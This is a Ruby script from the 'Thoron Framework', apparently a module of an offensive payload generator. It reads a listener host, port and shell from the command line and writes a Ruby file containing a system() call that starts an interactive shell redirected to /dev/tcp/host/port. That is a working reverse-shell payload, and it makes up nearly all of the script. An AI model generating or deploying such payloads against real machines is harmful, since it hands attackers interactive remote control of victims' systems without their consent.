#!/usr/bin/env ruby

#            ---------------------------------------------------
#                             Thoron Framework                                
#            ---------------------------------------------------
#                  Copyright (C) <2020>  <Entynetproject>       
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

e = "\033[1;31m[-] \033[0m"
p = "\033[1;77m[>] \033[0m"
g = "\033[1;34m[*] \033[0m"
s = "\033[1;32m[+] \033[0m"
h = "\033[1;77m[@] \033[0m"

require 'optparse'
require 'ostruct'

options = OpenStruct.new
OptionParser.new do |opt|
  opt.on('-h', '--local-host <local_host>', 'Local Host.') { |o| options.local_host = o }
  opt.on('-p', '--local-port <local_port>', 'Local Port.') { |o| options.local_port = o }
  opt.on('-s', '--target-shell <target_shell>', 'Target Shell.') { |o| options.target_shell = o }
  opt.on('-o', '--output-file <output_file>', 'Output File.') { |o| options.output_file = o }
end.parse!

host = options.local_host
port = options.local_port
shell = options.target_shell
file = options.output_file

sleep(0.5)
puts "#{g}Writing payload..."
sleep(1)
open(file, 'w') { |f|
    f.puts "system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\")"
}
